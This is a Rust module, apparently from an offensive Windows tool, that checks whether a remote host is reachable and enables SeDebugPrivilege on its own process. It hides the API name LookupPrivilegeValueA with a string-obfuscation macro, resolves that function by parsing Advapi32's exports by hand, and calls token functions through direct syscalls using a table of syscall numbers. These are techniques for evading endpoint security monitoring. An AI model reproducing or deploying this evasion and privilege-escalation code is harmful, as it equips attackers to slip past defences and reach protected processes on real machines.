use std::net::{TcpStream, ToSocketAddrs};
use std::ptr::null_mut;
use std::time::Duration;
use std::ffi::CString;
use anyhow::{anyhow, bail, Context, Result};

use crate::nt_api::*;
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::libloaderapi::LoadLibraryA;
use winapi::um::winnt::{HANDLE, TOKEN_PRIVILEGES, TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, LUID};
use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
use winapi::shared::ntstatus::STATUS_SUCCESS;
use obfuse::obfuse;

use crate::parse_pe::{PeModuleParser, get_module_handle};

use crate::{debug_eprintln, debug_println};


pub fn check_host_online(host: &str, port: u16) -> Result<()> {
    let mut addrs = (host, port)
        .to_socket_addrs()
        .with_context(|| format!("DNS resolution was failed or address invaild: {}:{}", host, port))?;

    let timeout = Duration::from_secs(2);
    let mut last_err = None;

    for addr in addrs {
        match TcpStream::connect_timeout(&addr, timeout) {
            Ok(_) => {
                // As long as one IP can be connected, return OK.
                return Ok(());
            }
            Err(e) => {
                // store this err, continue to next ip
                last_err = Some(e);
            }
        }
    }

    match last_err {
        Some(e) => bail!("Cannot to connect {}:{}, reason: {}", host, port, e),
        None => bail!("DNS resolution was successful, but no usable IP addresses were returned."),
    }

}


type LookupPrivilegeValueAFn = unsafe extern "system" fn(
    lp_system_name: *const i8,
    lp_name: *const i8,
    lp_luid: *mut LUID,
) -> i32;

pub fn enable_debug_privilege() -> Result<()>
{

    unsafe {

        let mut process_handle : HANDLE = GetCurrentProcess();
        let token_handle: HANDLE = null_mut();

        let status = nt_open_process_token(
            process_handle,
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
            &token_handle as * const HANDLE as *mut HANDLE, 
            NT_SSN[NtIndex::NtOpenProcessToken as usize].ssn, 
            NT_SSN[NtIndex::NtOpenProcessToken as usize].syscall_ret
        );

        if status != STATUS_SUCCESS {
            anyhow::bail!("[ERROR] Failed to open proc token: 0x{:X}.", status);
        }

        let obfused_lookup_privilege_value = obfuse!("LookupPrivilegeValueA");
        let lookup_privilege_value_str = obfused_lookup_privilege_value.as_str();


        let mut advapi32_dll = get_module_handle("Advapi32.dll\0");
        if advapi32_dll == null_mut() {
            advapi32_dll = LoadLibraryA("Advapi32.dll\0".as_ptr() as *const i8) as *mut u8;
        }



        let parser = PeModuleParser::new(advapi32_dll);
        let Some(lookup_privilege_value_addr) = parser.get_func_addr(lookup_privilege_value_str) else {
            anyhow::bail!("[ERROR] Faied to find address of LPV")
        };

        let lookup_privilege_value: LookupPrivilegeValueAFn = std::mem::transmute(lookup_privilege_value_addr);

        let system_name = std::ptr::null(); // NULL
        let privilege_name = CString::new("SeDebugPrivilege").expect("CString::new failed");
        let mut luid: LUID = std::mem::zeroed() ;

        let status = lookup_privilege_value (
            system_name,
            privilege_name.as_ptr(),
            &mut luid,
        );

        if status == 0 {
            anyhow::bail!("[ERROR] LPV failed");
        }


        let mut new_state: TOKEN_PRIVILEGES = std::mem::zeroed();
        new_state.PrivilegeCount = 1;
        new_state.Privileges[0].Luid = luid;
        new_state.Privileges[0].Attributes = 2;

        let status = nt_adjust_privileges_token(
            token_handle, 
            0, 
            &mut new_state, 
            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32, 
            null_mut(), 
            null_mut(), 
            NT_SSN[NtIndex::NtAdjustPrivilegesToken as usize].ssn, 
            NT_SSN[NtIndex::NtAdjustPrivilegesToken as usize].syscall_ret
        );

        if status != STATUS_SUCCESS {
            anyhow::bail!("[ERROR] Adjust Priv TKN failed");
        }

    }

    Ok(())

}